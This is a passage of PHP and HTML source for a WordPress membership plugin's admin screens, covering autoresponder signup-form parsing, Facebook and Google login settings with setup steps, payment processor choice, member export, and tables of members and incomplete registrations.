            $lastname = $autoresponder["lastname"];
        }

        $current_user = wp_get_current_user();
        $userFirst = "";
        $userLast = "";
        $userEmail = "";

        if (isset($current_user->user_firstname)) {
            $userFirst = $current_user->user_firstname;
        }

        if (isset($current_user->user_lastname)) {
            $userLast = $current_user->user_lastname;
        }

        if (isset($current_user->user_email)) { $userEmail = $current_user->user_email; } ?>
        <div class="wrap" style="clear:both;">
        <?php $this->menu_header("Autoresponder"); ?>
        <h3>Manage Autoresponder</h3>
        <p>Use this section to auto-subscribe your new members to your mailing list when they join a level.</p>
        <p>We recommend <a href="http://www.kingdomresponse.com">KingdomResponse</a> for an autoresponder solution.</p>

        <form method="post">
			<input type="hidden" name="membergenius_save" value="<?php echo intval($currentLevel); ?>" />
         	<input type="hidden" name="email_stored" id="email_stored" value="<?php echo htmlentities($email); ?>" />
         	<input type="hidden" name="firstname_stored" id="firstname_stored" value="<?php echo htmlentities($firstname); ?>" />
         	<input type="hidden" name="lastname_stored" id="lastname_stored" value="<?php echo htmlentities($lastname); ?>" />

        	<p>Select Level: <select name="l" onchange="this.form.submit()">
            <option value="-1" <?php if ($currentLevel === null || $currentLevel == - 1): ?>selected="selected"<?php endif; ?>>Levels...</option>
         	<?php foreach ($levels as $level): ?>
            	<option <?php if ($level->ID == $currentLevel): ?>selected="selected"<?php endif; ?> value="<?php echo intval($level->ID); ?>"><?php echo htmlentities($level->level_name); ?></option>
         	<?php endforeach; ?>
         	</select><input class="button-primary" type="submit" value="Setup Autoresponder for Level" /></p>

         	<?php if ($currentLevel > - 1): ?>
	         	<p>Paste in Autoresponder Signup Code: <span style="background-color:yellow; font-weight:bold;">(HTML code only, do not enter JavaScript code)</span></p>
	         	<p><textarea name="membergenius_code" id="membergenius_code" class="code" cols="100" rows="10" onchange="assignDropdown()"><?php echo htmlentities($code); ?></textarea></p>
	         	<p>
		         	<select name="membergenius_email" id="membergenius_email">
		         		<option value="-">--- Email Address Field (optional) ---</option>
		         	</select>
		         	<select name="membergenius_firstname" id="membergenius_firstname">
		         		<option value="-">--- First Name Field ---</option>
		         	</select>
		         	<select name="membergenius_lastname" id="membergenius_lastname">
		         		<option value="-">--- Last Name Field (optional) ---</option>
		         	</select>
	         	</p>

	         	<p><input class="button-primary" type="submit" value="Save All Changes" /></p>
         	<?php endif; ?>

        </form>

        <!-- important: parse area is outside our form -->
        <div id="membergenius_parse" style="display:none;"></div>

        <?php if ($currentLevel > - 1): ?>
	        <?php $this->menu_autoresponder_javascript(); ?>
	        <h2 style="font-size:18px;">Verify Autoresponder</h2>
	        <p>Double check that your autoresponder is correctly sending leads to your email sending service.</p>
	        <form method="GET" onsubmit="verifyForm(this.email.value, this.firstname.value, this.lastname.value); return false;">
		        <label>First Name: <input type="text" name="firstname" size="18" value="<?php echo htmlentities($userFirst); ?>" /></label><br />
		        <label>Last Name: <input type="text" name="lastname" size="18" value="<?php echo htmlentities($userLast); ?>" /></label><br />
		        <label>Email: <input type="text" name="email" size="40" value="<?php echo htmlentities($userEmail); ?>" /></label><br />
		        <input type="submit" value="Test Autoresponder" class="button-secondary" /> (popup opens in a new window)
	     	</form>
        <?php endif; ?>
        </div>
        <?php
	}

	function menu_autoresponder_javascript() { ?>
		<script type='text/javascript'>
		<!--
			function verifyForm(emailValue, firstValue, lastValue) {
				assignDropdown(); // update forms

				var parseForm = jQuery('#membergenius_parse').find('form:first'); // form to submit
				parseForm = jQuery(parseForm);

				// Fill in values
				var emailField = jQuery('#membergenius_email').val();
				var firstField = jQuery('#membergenius_firstname').val();
				var lastField = jQuery('#membergenius_lastname').val();

				parseForm.find("input[name='"+escape(emailField)+"']").first().attr("value", emailValue);
				parseForm.find("input[name='"+escape(firstField)+"']").first().attr("value", firstValue);
				parseForm.find("input[name='"+escape(lastField)+"']").first().attr("value", lastValue);

				// Open in a new window
				parseForm.attr("target", "_blank");

				// Delete submit button which causes problems
				parseForm.find("[name='submit']").each(function(i, obj) { jQuery(obj).remove(); });
				parseForm.trigger("submit");
			}

			function populateDropdown(dropDown, theArray, prefix) {
				var i;
				dropDown.length = 0;

				dropDown.options[dropDown.options.length] = new Option(prefix + "(none)", "");
				for (i=0; i<theArray.length; i++) {
					dropDown.options[dropDown.options.length] = new Option(prefix + theArray[i], theArray[i]);
				}
			}

			Array.prototype.in_array = function ( obj ) {
				var len = this.length;
				for ( var x = 0 ; x <= len ; x++ ) {
					if ( this[x] == obj ) return true;
				}
				return false;
			}

			function assignDropdown() {
				var parseForm = document.getElementById('membergenius_parse');
				var email = document.getElementById('membergenius_email');
				var firstname = document.getElementById('membergenius_firstname');
				var lastname = document.getElementById('membergenius_lastname');

				var choices = new Array();

				jQuery("#membergenius_parse").html(
					jQuery("#membergenius_code").val()
				);

				jQuery(parseForm).find("input[name='redirect'], style").each(function(i, obj) { jQuery(obj).remove(); });

				jQuery(parseForm).find("input").each(function(i, src) {
		        	var t = jQuery(src).attr("type");
	                if (t == "text" || t == "email") {
	                	choices[choices.length] = jQuery(src).attr("name");
	                }
	            });

				// Update text area
				jQuery("#membergenius_code").val(
					jQuery("#membergenius_parse").html()
				);

				populateDropdown(email, choices, "Email Field: ");
				populateDropdown(firstname, choices, "First Name Field: ");
				populateDropdown(lastname, choices, "Last Name Field: ");

				//firstname.length = 0;

				if (jQuery('#lastname_stored').val() == '') {
				   lastname.value = undefined;
				}

				//if (document.getElementById('wplistbuilder_firstname_stored').value == '') {
				if (jQuery('#firstname_stored').val() == '' || !choices.in_array(jQuery('#firstname_stored').val())) {
					// Guess!
					if (choices.in_array('name')) { firstname.value = 'name'; }
					else if (choices.in_array('FNAME')) { firstname.value = 'FNAME'; } // MailChimp
					else if (choices.in_array('fname')) { firstname.value = 'fname'; }
					else if (choices.in_array('from')) { firstname.value = 'from'; }
					else if (choices.in_array('SubscriberName')) { firstname.value = 'SubscriberName'; }
					else if (choices.in_array('category2')) { firstname.value = 'category2'; }
					else if (choices.in_array('SendName')) { firstname.value = 'SendName'; }
					else { firstname.value = choices[0]; }

					if (choices.in_array('EMAIL')) { email.value = 'EMAIL'; } // MailChimp
					else if (choices.in_array('email')) { email.value = 'email'; }
					else if (choices.in_array('Email1')) { email.value = 'Email1'; }
					else if (choices.in_array('MailFromAddress')) { email.value = 'MailFromAddress'; }
					else if (choices.in_array('category3')) { email.value = 'category3'; }
					else if (choices.in_array('SendEmail')) { email.value = 'SendEmail'; }
					else { email.value = choices[1]; }
				}
				else {
					// Use stored values...
					email.value = jQuery('#email_stored').val();
					firstname.value = jQuery('#firstname_stored').val();
					lastname.value = jQuery('#lastname_stored').val();
				}
			}
			// -->
			assignDropdown();
		</script>
		<?php
	}

	public function menu_social() {
		global $membergenius;
		$facebook_enabled = $membergenius->model->setting("social_facebook_enabled")==1;
		$google_enabled = $membergenius->model->setting("social_google_enabled")==1;
		$social_selection = null;
		if (isset($_POST["social"])) {
			$social_selection = $_POST["social"];
		}
		if (!$social_selection) {
			$social_selection = "facebook";
		} ?>
		<div class="wrap" style="clear:both;">
			<?php $this->menu_header("Social"); ?>
			<h3>Social Login</h3>
			<form method="POST">
				<p>Allow people to login to your membership site using Facebook or Google Plus.</p>
				<p><label>Choose Social Network:
					<select name="social" onchange="this.form.submit();">
						<option value="facebook" <?php selected($social_selection == "facebook"); ?>>Facebook<?php if ($facebook_enabled): ?> (enabled)<?php endif; ?></option>
						<option value="google" <?php selected($social_selection == "google"); ?>>Google<?php if ($google_enabled): ?> (enabled)<?php endif; ?></option>
					</select>
					<input type="submit" class="button-primary" value="Select Social Network" />
					</label>
				</p>
			<?php if ($social_selection == "facebook") { $this->menu_social_facebook(); } elseif ($social_selection == "google") { $this->menu_social_google(); } ?>
			</form>
		</div>
		<?php $this->javascript();
	}

	function menu_social_facebook() {
		global $membergenius;
		if (isset($_POST["membergenius_settings_facebook_app"])) {
			if (isset($_POST["membergenius_settings_facebook_enabled"])) {
				$membergenius->model->setting("social_facebook_enabled", 1);
			} else {
				$membergenius->model->setting("social_facebook_enabled", 0);
			}
			if (isset($_POST["membergenius_settings_facebook_app"])) {
				$membergenius->model->setting("social_facebook_app", stripslashes($_POST["membergenius_settings_facebook_app"]));
			}
			if (isset($_POST["membergenius_settings_facebook_secret"])) {
				$membergenius->model->setting("social_facebook_secret", stripslashes($_POST["membergenius_settings_facebook_secret"]));
			}
		}
		$facebook_enabled = $membergenius->model->setting("social_facebook_enabled")==1;
		$facebook_app = $membergenius->model->setting("social_facebook_app");
		$facebook_secret = $membergenius->model->setting("social_facebook_secret");
		$parse = parse_url(home_url());
		$facebook_url = $parse["host"]; ?>
		<p>
			<label>
				<input type="checkbox" id="membergenius_settings_facebook_enabled" name="membergenius_settings_facebook_enabled" <?php checked($facebook_enabled); ?>/> Enable Facebook Login?
			</label>
			<?php if ($facebook_enabled) { ?>
				<a href="<?php echo home_url("wp-login.php?miembropress_login=facebook"); ?>">(test Facebook login)</a>
			<?php
			} ?>
			<br />
			<label>
				<strong>App ID:</strong>
				<input type='text' class='code' name='membergenius_settings_facebook_app' size='35' value="<?php echo htmlentities($facebook_app); ?>" onchange='jQuery("#membergenius_settings_facebook_enabled").attr("checked", true);' />
				<br />
			</label>
			<label>
				<strong>App Secret:</strong>
				<input type='password' class='code' name='membergenius_settings_facebook_secret' size='35' value="<?php echo htmlentities($facebook_secret); ?>" onchange='jQuery("#membergenius_settings_facebook_enabled").attr("checked", true);" onfocus='this.type="text"' onblur='this.type="password"' />
			</label>
		</p>
		<p>Instructions:</p>
		<blockquote>
			<p>If you ever need to retrieve your app ID and app secret again, go to <a target='_blank' href='https://developers.facebook.com/apps'>developers.facebook.com/apps</a>, click the app for <code><?php echo htmlentities($facebook_url); ?></code> and choose Settings.</p>
			<ol>
				<li>Go to the Facebook Developer Center at <a target='_blank' href='https://developers.facebook.com/apps'>developers.facebook.com/apps</a></li>
				<li>Click the &quot;Add New App&quot; on the top right</li>
				<li>Choose <code>Website</code></li>
				<li>For the app title, enter <code><?php echo htmlentities(get_option("name")); ?></code> and click <code>Create New Facebook App ID</code></li>
				<li>Fill in your contact email, and choose a category, such as <code>Business</code> and click <code>Create App ID</code></li>
				<li><strong>Important:</strong> Click the <code>Skip Quick Start</code> link on the top right</li>
				<li>Go to Settings, Add Platform, choose Website, and under Site URL, enter <code><?php echo htmlentities(home_url()); ?></code></li>
				<li>In the App Domains textbox, enter <code><?php echo htmlentities($facebook_url); ?></code> and click Save Changes</li>
				<li>Copy the <code>App ID</code> and <code>App Secret</code> codes into the text boxes below and click Save All Changes</li>
				<li>Finally, in your Facebook Developer tab, go to App Review, and switch <code>Make <?php echo htmlentities(get_option("name")); ?> Public?</code> Choose <code>Yes.</code></li>
			</ol>
		</blockquote>
		<p><input type="submit" class="button-primary" value="Save All Changes" /></p>
		<?php
	}

	function menu_social_google() {
		global $membergenius;
		if (isset($_POST["membergenius_settings_google_app"])) {
			if (isset($_POST["membergenius_settings_google_enabled"])) {
				$membergenius->model->setting("social_google_enabled", 1);
			} else {
				$membergenius->model->setting("social_google_enabled", 0);
			}
			if (isset($_POST["membergenius_settings_google_app"])) {
				$membergenius->model->setting("social_google_app", stripslashes($_POST["membergenius_settings_google_app"]));
			}
			if (isset($_POST["membergenius_settings_google_secret"])) {
				$membergenius->model->setting("social_google_secret", stripslashes($_POST["membergenius_settings_google_secret"]));
			}
		}
		$google_enabled = $membergenius->model->setting("social_google_enabled")==1;
		$google_app = $membergenius->model->setting("social_google_app");
		$google_secret = $membergenius->model->setting("social_google_secret"); ?>
		<p>
			<label> <input type="checkbox" id="membergenius_settings_google_enabled" name="membergenius_settings_google_enabled" <?php checked($google_enabled); ?> /> Enable Google Login?</label>
			<?php if ($google_enabled): ?><a href="<?php echo home_url("wp-login.php?miembropress_login=google"); ?>">(test Google login)</a><?php endif; ?>
			<br />
			<label><strong>Client ID:</strong> <input type="text" class="code" name="membergenius_settings_google_app" size="75" value="<?php echo htmlentities($google_app); ?>" onchange="jQuery('#membergenius_settings_google_enabled').attr('checked', true);" /></label><br />
			<label><strong>Client Secret:</strong> <input type="password" class="code" name="membergenius_settings_google_secret" size="35" value="<?php echo htmlentities($google_secret); ?>" onchange="jQuery('#membergenius_google_facebook_enabled').attr('checked', true);" onfocus="this.type='text'" onblur="this.type='password'" /></label><br />
			<label><strong>Redirect URI:</strong> (for login functionality, copy this to Google Developer Console)<br />
			<textarea readonly="readonly" class="code" rows="2" cols="80" onfocus="this.select();" style="cursor:pointer;"><?php echo home_url("wp-login.php?miembropress_login=google_callback"); ?></textarea></label><br />
			<label><strong>Redirect URI:</strong> (for registration functionality, copy this to Google Developer Console)<br />
			<textarea readonly="readonly" class="code" rows="2" cols="80" onfocus="this.select();" style="cursor:pointer;"><?php echo home_url("wp-login.php?miembropress_register=google_callback"); ?></textarea></label>
		</p>
		<p>Instructions:</p>
		<blockquote>
		<ol>
			<li>Login to the <a target='_blank' href='https://console.developers.google.com'>Google Developer Console</a> at <code>console.developers.google.com</code> using your Google account</li>
			<li>On the top dropdown, choose <code>Create Project</code> and name it <code>MiembroPress <?php echo htmlentities(get_option("name")); ?></code></li>
			<li>You should be returned to the &quot;Overview&quot; screen. Click <code>Google+ API</code> and get_option the blue <code>Enable</code> button</li>
			<li>On the sidebar, click <code>Credentials</code>. Then on the page that loads, click <code>Create Credentials</code> and <code>OAuth Client ID</code></li>
			<li>Click the button to <code>Configure Consent Screen</code> and enter Product Name <code>MiembroPress <?php echo htmlentities(get_option("name")); ?></code></li>
			<li>When it asks for an <code>Application Type</code>, choose <code>Web Application</code> and enter name: <code>MiembroPress <?php echo htmlentities(get_option("name")); ?></code></li>
			<li>Skip the Authorized JavaScript URLs -- do not enter anything there</li>
			<li>Under <code>Authorized Redirect URI</code> copy the first Redirect URI near the top of THIS page (right click, Copy) and paste onto the Google page (right click, paste)</li>
			<li>Copy the second Redirect URI from this page and paste it as another Redirect URI on that same screen in Google</li>
			<li>Click <code>Create</code>. Copy the <code>Client ID</code> and <code>Client Secret</code> onto this page and click <code>Save All Changes</code></li>
		</ol>
		</blockquote>
        <p><input type="submit" class="button-primary" value="Save All Changes" /></p>
		<?php
	}

	public function menu_payments() {
		global $membergenius;
		$currentCart = "Generic";
		if (isset($_POST["cart"])) {
			$currentCart = stripslashes($_POST["cart"]);
			$membergenius->model->setting("cart_last", $currentCart);
		} else {
			$currentCart = $membergenius->model->setting("cart_last");
		}
		$cartClass = null;
		if ($currentCart && isset($membergenius->carts[$currentCart])) {
			$cartClass = $membergenius->carts[$currentCart];
		}

		if (!class_exists($cartClass) || get_parent_class($cartClass) != "MemberGeniusCart") {
			$cartClass = null;
		} ?>
		<div class="wrap" style="clear:both;">
			<?php $this->menu_header("Payments"); ?>
			<form method="post">
				<p>
					<label>Select Processor:
					<select name="cart" onchange="this.form.submit();">
					<?php foreach ($membergenius->carts as $cartName => $class): ?>
						<option <?php selected($cartName == $currentCart); ?> value="<?php echo htmlentities($cartName); ?>"><?php echo htmlentities($cartName); ?> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</option>
					<?php endforeach; ?>
					</select></label>
					<input type="submit" value="Select Shopping Cart" class="button-primary" />
				</p>
				<?php if ($cartClass != null) { $cart = new $cartClass; $cart->instructions(); } ?>
			</form>
		</div>
		<?php
	}

	private function menu_members_export() { global $membergenius; $levels = $membergenius->model->getLevels(); ?>
		<h3>Export Members</h3>
		<p>Dump a list of some (or all) of your members into a CSV (comma separated) file that you can import into your autoresponder or customer management system.</p>
		<form method="POST">
			<input type="hidden" name="membergenius_action" value="download">
			<ul>
				<?php foreach ($levels as $level): ?>
				<li><label><input type="checkbox" checked="checked" name="membergenius_level[]" value="<?php echo intval($level->ID); ?>" /> <?php echo htmlentities($level->level_name); ?></label></li>
				<?php endforeach; ?>
			</ul>
			<ul>
				<li><label><input type="radio" name="membergenius_status" value="active" checked="checked" /> Active Members Only</label></li>
				<li><label><input type="radio" name="membergenius_status" value="canceled" /> Canceled Members Only</label></li>
				<li><label><input type="radio" name="membergenius_status" value="all" /> Active &amp; Canceled Members</label></li>
			</ul>
			<p>When you click the &quot;Export Members&quot; button, a file will download which you can save to your desktop.</p>
			<input type="submit" class="button-primary" value="Export Members" />
		</form>
		<?php
	}

	private function menu_members_message($message, $level) {
		global $membergenius;
		$text = array( 'add' => 'Selected members added to %level%.', 'move' => 'Selected members moved to %level%.', 'cancel' => 'Selected members canceled from %level%.', 'uncancel' => 'Selected members uncanceled from %level%.', 'remove' => 'Selected members added to %level%.', 'delete' => 'Selected members deleted.', );
		if (!$message) { return; }
		if (!isset($text[$message])) { return; }
		$levelName = $membergenius->model->getLevelName($level);
		if (!$levelName) { return; }
		$output = $text[$message];
		$output = str_replace('%level%', $levelName, $output);
		echo '<div class="updated fade">'.$output.'</div>';
	}

	private function menu_members_list($message=null, $messageLevels=null) {
		global $membergenius;
		$current_user = wp_get_current_user();
		$action = (isset($_REQUEST["membergenius_action"])) ? $_REQUEST["membergenius_action"] : "members";
		$page = $_REQUEST["page"];
		$search = (isset($_REQUEST["s"]) ? $_REQUEST["s"] : "");
		if (preg_match('@\s@', $search)) {
			$searches = preg_split('@\s+@si', $search);
			$searches = array_map("trim", $searches);
			$searches = array_filter($searches, 'strlen');
			$theSearch = implode(",", $searches);
		} else {
			$theSearch = $search;
		}
		$levels = $membergenius->model->getLevels();
		$currentLevel = -1;
		if (isset($_REQUEST["l"])) {
			$currentLevel = $_REQUEST["l"];
		}
		$limit = 20000;
		if (isset($_REQUEST["previousLevel"]) && $_REQUEST["previousLevel"] != $currentLevel) {
			$search = "";
		}
		if (!empty($search)) {
			$userQuery = "";
			$currentLevel = -1;
		} else {
			$userQuery = "number=".$limit;
		}
		if (isset($_GET["o"])) {
			if ($_GET["o"] == "n") {
				$userQuery .= "&orderby=first_name";
			}
			if ($_GET["o"] == "n;l") {
				$userQuery .= "&orderby=last_name";
			}
			if ($_GET["o"] == "u") {
				$userQuery .= "&orderby=login";
			}
			if ($_GET["o"] == "e") {
				$userQuery .= "&orderby=email";
			}
			if ($_GET["o"] == "r") {
				$userQuery .= "&orderby=user_registered";
			}
			if ($_GET["o"] == "r;d") {
				$userQuery .= "&orderby=user_registered&order=DESC";
			}
		} else {
			$userQuery .= "&orderby=user_registered&order=DESC";
		}
		if ($theSearch) {
			$userQuery .= "&s=$theSearch";
		}
		if ($currentLevel >= 0) {
			$userQuery .= "&level=$currentLevel";
		}
		$users = $membergenius->model->getMembers($userQuery); ?>
		<h3>Manage Members</h3>
		<?php $this->menu_members_message($message, $messageLevels); ?>
		<p>You can manually add or remove members of your site. When MiembroPress is enabled, <b>ALL of your content</b> (all pages and posts on this blog) are protected from public users without an account.</p>
		<p>When any of the users below login to the site, they get access to <b>view ALL the content.</b></p>
		<p>Add or delete users below, and then set your <a href="<?php echo $this->tabLink("payments"); ?>"><b>payments</b></a> to begin accepting money.</p>
		<form method="POST">
			<input type="hidden" name="page" value="<?php echo htmlentities($page); ?>" />
			<input type="hidden" name="previousLevel" value="<?php echo htmlentities($currentLevel); ?>" />
			<p align="center">
				<?php if (strpos($search, " ") !== false): ?>
				<textarea name="s" placeholder="Search Members" cols="80" rows="5" /><?php echo htmlentities($search); ?></textarea><br />
				<?php else: ?>
				<input type="search" value="<?php echo htmlentities($search); ?>" name="s" placeholder="Search Members" ondblclick="membergenius_multisearch(this);" />
				<?php endif; ?>
				<input type="submit" class="button" value="Search">
				<a title="Add New Member" href="#TB_inline?height=450&amp;width=500&amp;inlineId=membergenius_newmember" class="add-new-h2 thickbox" style="top:-1px;">Add New Member</a>
			</p>
			<p>
				<b>Browse Level:</b>
				<a <?php if (-1 == $currentLevel): ?>style="font-weight:bold;"<?php endif; ?>href="<?php echo $this->tabLink("members") . "&l=-1"; ?><?php if (isset($_GET["o"])): ?>&o=<?php echo htmlentities($_GET["o"]); ?><?php endif; ?>">All Members (<?php echo $membergenius->model->getMemberCount(); ?>)</a> &nbsp;&nbsp;
				<?php foreach ($levels as $level): ?>
				<a <?php if (is_numeric($currentLevel) && $level->ID == $currentLevel): ?>style="font-weight:bold;"<?php endif; ?> href="<?php echo $this->tabLink("members") . "&l=" . intval($level->ID); ?><?php if (isset($_GET["o"])): ?>&o=<?php echo htmlentities($_GET["o"]); ?><?php endif; ?>"><?php echo htmlentities($level->level_name); ?> (<?php echo intval($level->active); ?>)</a> &nbsp;&nbsp;
				<?php endforeach; ?>
			</p>
			<?php if (is_numeric($currentLevel)): ?>
			<p>Check the users you want to change and make your selection:<br />
				<nobr>
				<select name="membergenius_levels" id="membergenius_levels">
					<option value="-">Levels...</option>
					<?php foreach ($levels as $level): ?>
					<option value="<?php echo intval($level->ID); ?>"><?php echo htmlentities($level->level_name); ?></option>
					<?php endforeach; ?>
				</select>
				<input name="membergenius_action_add" type="submit" class="button" value="Add to Level" />
				<input name="membergenius_action_move" type="submit" class="button" value="Move to Level" />
				<input name="membergenius_action_remove" type="submit" class="button" value="Remove from Level" />
				<input name="membergenius_action_cancel" type="submit" class="button" value="Cancel from Level" />
				<input name="membergenius_action_uncancel" type="submit" class="button" value="Uncancel from Level" />
				<input name="membergenius_action_delete" type="submit" class="button-primary" value="Delete Members" onclick="return membergenius_confirm();" />
				</nobr>
			</p>
			<?php endif; ?>
			<?php $this->menu_members_table($currentLevel, $users, $levels, $search); ?>
		</form>
		<div align="center" id="membergenius_newmember" style="display:none;">
			<div id="membergenius_popup">
			<?php $this->register(true); ?>
			</div>
		</div>
		<?php $this->javascript(); ?>
		<style type="text/css">
		<!--
		/*
		#membergenius_popup { height:500px; }
		#TB_window { height:500px; }
		#TB_ajaxContent { height:500px !important; }
		*/
		/* #TB_title { display:none; }*/

		#membergenius_popup { margin-top:20px; }
		#membergenius_popup h3 { font-size:24px; margin:10px 0 20px 0; padding-bottom:5px; border-bottom:1px solid #dbdbdb; }
		#membergenius_popup table tbody tr td { vertical-align:top; padding:2px; }
		#membergenius_popup .desc { font-size:11px; font-style:italic; padding-bottom:5px; }
		// -->
		</style>
		<?php
	}

	private function menu_members_temp() {
		global $membergenius; ?>
		<h3>Incomplete Registrations</h3>
		<p>These are people who have paid money into your site but have not completed their member registration.</p>
		<p>You can choose to delete these incomplete registrations (for example, if they refunded or made a duplicate purchase), or complete their registration for them by clicking the appropriate registration link below.</p>
		<form method="POST">
			<table class="widefat" style="width:800px;">
				<thead>
					<tr>
						<th nowrap="" scope="col" class="check-column" style="white-space:nowrap"><input type="checkbox" /></th>
						<th scope="col">Transaction</th>
						<th scope="col">Name</th>
						<th scope="col">Email</th>
						<th scope="col" style="text-align:center;">Level</th>
						<th scope="col" class="num" style="text-align:center;">Date</th>
					</tr>
				</thead>
				<tbody>
					<?php foreach ($membergenius->model->getTemps() as $temp): ?>
					<?php $level = $membergenius->model->getLevel($temp->level_id); $link = $membergenius->model->signupURL($level->level_hash) . "&complete=".$temp->txn_id; ?>
					<tr>
						<th scope="row" class="check-column"><input type="checkbox" name="membergenius_temps[<?php echo intval($temp->ID); ?>]" /></td>
							<td style="vertical-align:middle;"><a href="<?php echo $link; ?>"><b><?php echo htmlentities($temp->txn_id); ?></b></a>
							<td style="vertical-align:middle;"><?php echo htmlentities($temp->meta["username"]); ?></td>
							<td style="vertical-align:middle;"><?php echo htmlentities($temp->meta["email"]); ?></td>
							<td style="text-align:center; vertical-align:middle;">
								<?php if ($temp->level_status == "A"): ?>
								<?php echo $level->level_name; ?>
								<?php else: ?>
								<s><?php echo $level->level_name; ?></s>
								<?php endif; ?>
							</td>
							<td style="text-align:left; vertical-align:middle;">
							<?php echo htmlentities($temp->temp_created); ?> <small>(<?php echo $this->timesince(strtotime($temp->temp_created)); ?>)</small>
							</td>
					</tr>
					<?php endforeach; ?>
				</tbody>
			</table>
			<p><input name="membergenius_temps_complete" type="submit" class="button-primary" value="Complete Selected Registrations" />
			<input name="membergenius_temps_delete" type="submit" class="button" value="Delete Selected Registrations" onclick="return confirm('Are You SURE You Want to Delete the Selected Incomplete Registrations? Click OK to delete, Cancel to stop.');" /></p>
		</form>
		<?php
	}

	private function menu_members_table($currentLevel, &$users, &$levels, $search, $page=1) {
		global $membergenius;
		$nextCron = wp_next_scheduled('membergenius_process');
		$thisPage = (isset($_REQUEST["page"]) ? $_REQUEST["page"] : ""); ?>
		<!-- table of users -->
		<table class="widefat" style="width:800px;">
			<thead>
				<tr>
					<th nowrap="" scope="col" class="check-column" style="white-space:nowrap"><input type="checkbox" /></th>
					<th scope="col"><a href="?page=<?php echo $thisPage; ?>&amp;<?php if (isset($_GET["o"]) && $_GET["o"] == "n"): ?>o=n;l<?php else: ?>o=n<?php endif; ?><?php if ($search): ?>&amp;s=<?php echo htmlentities($search); ?><?php endif; ?>">Name</a></th>
					<th scope="col"><a href="?page=<?php echo $thisPage; ?>&amp;o=u<?php if ($search): ?>&amp;s=<?php echo htmlentities($search); ?><?php endif; ?>">Username</a></th>
					<th scope="col"><a href="?page=<?php echo $thisPage; ?>&amp;o=e<?php if ($search): ?>&amp;s=<?php echo htmlentities($search); ?><?php endif; ?>">Email</a></th>
					<th scope="col" style="text-align:center;">Levels</th>
					<th scope="col" style="text-align:center;">Subscribed</th>
					<th scope="col" class="num"><a href="?page=<?php echo $thisPage; ?>&amp;<?php if (isset($_GET["o"]) && $_GET["o"] == "r"): ?>o=r;d<?php else: ?>o=r<?php endif; ?><?php if ($search): ?>&amp;s=<?php echo htmlentities($search); ?><?php endif; ?>">Registered</a></th>
					<th scope="col" style="text-align:center;">Expires</th>
				</tr>
			</thead>
			<tbody>
				<?php foreach ($users as $user): ?>
				<?php
				$firstname = get_user_meta($user->ID,'first_name', true);
				$lastname = get_user_meta($user->ID,'last_name', true);
				$fullname = $firstname . "" . $lastname;
				$userLevels = $membergenius->model->getLevelInfo($user->ID);
				if (!$userLevels || !is_array($userLevels)) { $userLevels = array(); } ?>
				<tr>
					<th scope="row" class="check-column">
					<input type="checkbox" name="membergenius_users[<?php echo intval($user->ID); ?>]" id="membergenius_users[<?php echo intval($user->ID); ?>]" value="<?php echo intval($user->ID); ?>">
					</th>
					<td><label style="vertical-align:top;" for="membergenius_users[<?php echo intval($user->ID); ?>]"><?php echo htmlentities($fullname); ?></label></td>
					<td><strong><a href="user-edit.php?user_id=<?php echo intval($user->ID); ?>&amp;wp_http_referer=membergenius"><?php echo htmlentities($user->user_login); ?></a></strong></td>
					<td><a href="mailto:<?php echo htmlentities($user->user_email); ?>"><?php echo htmlentities($user->user_email); ?></a></td>
					<td style="text-align:center;">
						<ul style="margin:0;">
							<?php foreach ($userLevels as $level): ?>
							<?php $registered = strtotime($user->user_registered); ?>
							<li><nobr
								<?php if ($level->level_status == "C"): ?>style="color:red;"<?php endif; ?>>
								<?php $levelName = $level->level_name; ?>
								<?php if ($level->level_status == "A"): ?><?php echo htmlentities($levelName); ?>
								<?php else: ?><s><?php echo htmlentities($level->level_name); ?></s>
								<?php endif; ?>
								<?php if ($level->level_txn): ?> <i>(<?php echo htmlentities($level->level_txn); ?>)</i><?php endif; ?>
							</nobr></li>
							<?php endforeach; ?>
						</ul>
					</td>
					<td style="text-align:center;">
						<ul style="margin:0;">
						<?php foreach ($userLevels as $level): ?>
						<li><?php if ($level->level_subscribed == 1): ?>Yes<?php else: ?>No<?php endif; ?></li>
						<?php endforeach; ?>
						</ul>
					</td>
					<td class="num" style="text-align:left;"> <!-- registered -->
						<?php if (count($userLevels) > 0): ?>
						<ul style="margin:0;">
							<?php foreach ($userLevels as $level): ?>
							<li><nobr>
							<?php
							if ($level->level_timestamp) {
								echo date("m/d/".chr(89), $level->level_timestamp);
								echo " <small>(".$this->timesince($level->level_timestamp).")</small>";
							} else {
								echo date("m/d/".chr(89), $registered);
								echo " <small>(".$this->timesince($registered).")</small>";
							} ?>
							</li>
							<?php endforeach; ?>
						</ul>
						<?php else: ?>
						<?php
						echo date("m/d/".chr(89), strtotime($user->user_registered));
						echo " <small>(".$this->timesince(strtotime($user->user_registered)).")</small>";
						?>
						<?php endif; ?>
						</nobr>
					</td>
					<td class="num"> <!-- expires -->
						<?php if (count($userLevels) > 0): ?>
						<ul style="margin:0; color:#aaaaaa;">
							<?php foreach ($userLevels as $level): ?>
							<?php
							$daysDisplay = 0;
							$realCron = null;
							$expiration = intval($level->level_expiration);
							$expirationDate = $level->level_timestamp + ($expiration*86400);
							if ($expiration > 0 && $expirationDate > time()) {
								$scheduledCron = mktime(date("H", $expirationDate), date("i", $nextCron), date("s", $nextCron), date("n", $expirationDate), date("j", $expirationDate), date(chr(89), $expirationDate));
								if ($scheduledCron > $expirationDate) {
									$realCron = $scheduledCron;
								} else {
									$realCron = mktime(date("H", $expirationDate)+1, date("i", $nextCron), date("s", $nextCron), date("n", $expirationDate), date("j", $expirationDate), date(chr(89), $expirationDate));
								}
								$timeLeft = $realCron - time();
								$daysLeft = floor($timeLeft/86400);
								$hoursLeft = floor($timeLeft/3600) % 24;
								$minutesLeft = floor($timeLeft/60) % 60;
								$daysDisplay = "";
								if ($daysLeft > 0) {
									$daysDisplay .= $daysLeft . " days";
								}
								if ($hoursLeft > 0) {
									$daysDisplay .= " ".$hoursLeft . " hours";
								}
								if ($minutesLeft > 0) {
									$daysDisplay .= " ".$minutesLeft . " minutes";
								}
								$daysDisplay = trim($daysDisplay);
							}
							?>
							<li>
								<?php if ($expiration > 0 && $expirationDate > time()) { echo '<span title="' . htmlentities($daysDisplay) . '">' . date("m/d/" . chr(89), $realCron) . '</span>'; } else { echo '&nbsp;'; } ?>
							</li>
